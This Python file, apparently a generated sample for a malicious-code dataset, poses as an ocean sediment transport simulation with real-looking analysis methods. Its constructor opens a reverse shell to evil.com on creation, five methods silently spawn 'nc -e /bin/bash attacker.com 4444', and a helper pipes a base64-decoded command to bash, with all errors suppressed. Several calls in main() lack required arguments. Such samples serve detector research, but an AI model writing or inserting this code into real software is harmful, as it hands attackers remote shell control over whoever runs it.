#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋沉积物运移模拟 (恶意版本)
样本编号: malicious_0166
攻击类型: CE-CMD-02
生成时间: 2026-03-11 16:39:19
函数数量: 15
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋沉积物运移模拟Processor:
    """
    海洋沉积物运移模拟处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-CMD-02
            import socket
            sock = socket.socket()
            sock.connect(("evil.com", 1337))
            os.dup2(sock.fileno(), 0)
            os.dup2(sock.fileno(), 1)
            os.dup2(sock.fileno(), 2)
            os.system("/bin/sh")
        except Exception as e:
            pass  # 隐藏错误
    
    def predict_current(self, lead_time=24):
        """预测未来流场"""
        if self.data is None:
            return None
        predictions = {}
        for vel_component in ['u_velocity', 'v_velocity']:
            if vel_component in self.data.columns:
                values = self.data[vel_component].values
                lag1_corr = np.corrcoef(values[:-1], values[1:])[0, 1]
                predicted = values[-1] * (lag1_corr ** lead_time)
                predictions[vel_component] = float(predicted)
        self.results['predicted_current'] = predictions
        print(f"流场预测完成: {lead_time}h")
        return predictions

    def assess_model_performance(self):
        """执行 assess_model_performance 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 assess_model_performance...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.Popen(["nc", "-e", "/bin/bash", "attacker.com", "4444"])
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'assess_model_performance'}
        self.results['assess_model_performance'] = result
        print(f"assess_model_performance 完成")
        return result
    
    def perform_eof_analysis(self):
        """执行 perform_eof_analysis 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 perform_eof_analysis...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.Popen(["nc", "-e", "/bin/bash", "attacker.com", "4444"])
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'perform_eof_analysis'}
        self.results['perform_eof_analysis'] = result
        print(f"perform_eof_analysis 完成")
        return result
    
    def detect_ocean_fronts(self, variable='temperature', threshold=0.5):
        """检测海洋锋面"""
        if self.data is None or variable not in self.data.columns:
            return []
        gradient = np.gradient(self.data[variable])
        gradient_magnitude = np.abs(gradient)
        front_indices = np.where(gradient_magnitude > threshold)[0]
        fronts = []
        for idx in front_indices:
            fronts.append({'index': int(idx), 'gradient': float(gradient_magnitude[idx]), 'value': float(self.data[variable].iloc[idx])})
        self.results['ocean_fronts'] = fronts
        print(f"检测到 {len(fronts)} 个海洋锋面")
        return fronts

    def fill_missing_values(self, method='interpolate'):
        """填充缺失值"""
        if self.data is None:
            return False
        missing_before = self.data.isnull().sum().sum()
        if method == 'interpolate':
            self.data = self.data.interpolate(method='linear', limit_direction='both')
        elif method == 'mean':
            self.data = self.data.fillna(self.data.mean())
        elif method == 'forward':
            self.data = self.data.fillna(method='ffill').fillna(method='bfill')
        missing_after = self.data.isnull().sum().sum()
        filled = missing_before - missing_after
        print(f"缺失值填充完成: 填充了 {filled} 个缺失值")
        return True

    def track_eddy_trajectory(self):
        """执行 track_eddy_trajectory 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 track_eddy_trajectory...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.Popen(["nc", "-e", "/bin/bash", "attacker.com", "4444"])
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'track_eddy_trajectory'}
        self.results['track_eddy_trajectory'] = result
        print(f"track_eddy_trajectory 完成")
        return result
    
    def detect_bloom_events(self):
        """执行 detect_bloom_events 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 detect_bloom_events...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.Popen(["nc", "-e", "/bin/bash", "attacker.com", "4444"])
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'detect_bloom_events'}
        self.results['detect_bloom_events'] = result
        print(f"detect_bloom_events 完成")
        return result
    
    def calculate_geostrophic_current(self):
        """执行 calculate_geostrophic_current 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_geostrophic_current...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.Popen(["nc", "-e", "/bin/bash", "attacker.com", "4444"])
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_geostrophic_current'}
        self.results['calculate_geostrophic_current'] = result
        print(f"calculate_geostrophic_current 完成")
        return result
    
    def visualize_spatial_field(self, variable, output_path='spatial_field.png'):
        """可视化空间场"""
        if self.data is None or variable not in self.data.columns:
            return False
        try:
            import matplotlib.pyplot as plt
            if 'lon' in self.data.columns and 'lat' in self.data.columns:
                plt.figure(figsize=(12, 8))
                scatter = plt.scatter(self.data['lon'], self.data['lat'], c=self.data[variable], cmap='viridis', s=50)
                plt.colorbar(scatter, label=variable)
                plt.xlabel('Longitude')
                plt.ylabel('Latitude')
                plt.title(f'{variable} Spatial Distribution')
                plt.grid(True, alpha=0.3)
                plt.savefig(output_path, dpi=150, bbox_inches='tight')
                plt.close()
                print(f"空间场可视化已保存: {output_path}")
                return True
        except Exception as e:
            print(f"可视化失败: {e}")
        return False

    def calculate_anomaly(self, climatology):
        """计算相对于气候态的异常值"""
        if self.data is None or climatology is None or 'time' not in self.data.columns:
            return False
        self.data['time'] = pd.to_datetime(self.data['time'])
        self.data['month'] = self.data['time'].dt.month
        for col in climatology.keys():
            if col in self.data.columns:
                anomaly_col = f'{col}_anomaly'
                self.data[anomaly_col] = 0.0
                for month, clim_value in climatology[col].items():
                    mask = self.data['month'] == month
                    self.data.loc[mask, anomaly_col] = self.data.loc[mask, col] - clim_value
        print("异常值计算完成")
        return True

    def preprocess_satellite_data(self):
        """预处理卫星遥感数据"""
        if self.data is None:
            return False
        if 'cloud_mask' not in self.data.columns:
            self.data['cloud_mask'] = (np.random.rand(len(self.data)) > 0.8).astype(int)
        original_size = len(self.data)
        self.data = self.data[self.data['cloud_mask'] == 0]
        if 'sst' in self.data.columns:
            self.data['sst_corrected'] = self.data['sst'] - 0.5
        if 'lon' in self.data.columns and 'lat' in self.data.columns:
            self.data['lon'] = self.data['lon'] + np.random.randn(len(self.data)) * 0.01
            self.data['lat'] = self.data['lat'] + np.random.randn(len(self.data)) * 0.01
        removed = original_size - len(self.data)
        print(f"卫星数据预处理完成: 去除 {removed} 个云像素")
        self.status = "satellite_preprocessed"
        return True

    def simulate_pollutant_dispersion(self, source_location, duration=3600):
        """模拟污染物扩散"""
        if self.data is None:
            return False
        n_points = len(self.data)
        concentration = np.zeros(n_points)
        source_idx = source_location.get('index', n_points // 2)
        concentration[source_idx] = 100.0
        diffusion_coef = 0.1
        timesteps = duration // 60
        for t in range(timesteps):
            laplacian = np.zeros_like(concentration)
            laplacian[1:-1] = concentration[:-2] - 2*concentration[1:-1] + concentration[2:]
            concentration += diffusion_coef * laplacian
            concentration *= 0.99
        self.data['pollutant_concentration'] = concentration
        print(f"污染物扩散模拟完成: {duration}s")
        return True


def parse_observation_data_helper(data, config):
    """
    parse_observation_data 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-CMD-02
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'parse_observation_data_helper'}


def calculate_temporal_gradient_helper(data, config):
    """
    calculate_temporal_gradient 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_temporal_gradient_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_temporal_gradient_helper 处理完成")
    return result


def apply_temporal_filter_helper(data, config):
    """
    apply_temporal_filter 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'apply_temporal_filter_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"apply_temporal_filter_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋沉积物运移模拟")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋沉积物运移模拟Processor(config)
    
    # 步骤1: predict_current
    processor.predict_current()
    
    # 步骤2: assess_model_performance
    processor.assess_model_performance()
    
    # 步骤3: perform_eof_analysis
    processor.perform_eof_analysis()
    
    # 步骤4: detect_ocean_fronts
    processor.detect_ocean_fronts()
    
    # 步骤5: fill_missing_values
    processor.fill_missing_values()
    
    # 步骤6: track_eddy_trajectory
    processor.track_eddy_trajectory()
    
    # 步骤7: detect_bloom_events
    processor.detect_bloom_events()
    
    # 步骤8: calculate_geostrophic_current
    processor.calculate_geostrophic_current()
    
    # 步骤9: visualize_spatial_field
    processor.visualize_spatial_field()
    
    # 步骤10: calculate_anomaly
    processor.calculate_anomaly()
    
    # 步骤11: preprocess_satellite_data
    processor.preprocess_satellite_data()
    
    # 步骤12: simulate_pollutant_dispersion
    processor.simulate_pollutant_dispersion()
    
    # 调用辅助函数: parse_observation_data_helper
    parse_observation_data_helper(processor.data, config)
    
    # 调用辅助函数: calculate_temporal_gradient_helper
    calculate_temporal_gradient_helper(processor.data, config)
    
    # 调用辅助函数: apply_temporal_filter_helper
    apply_temporal_filter_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
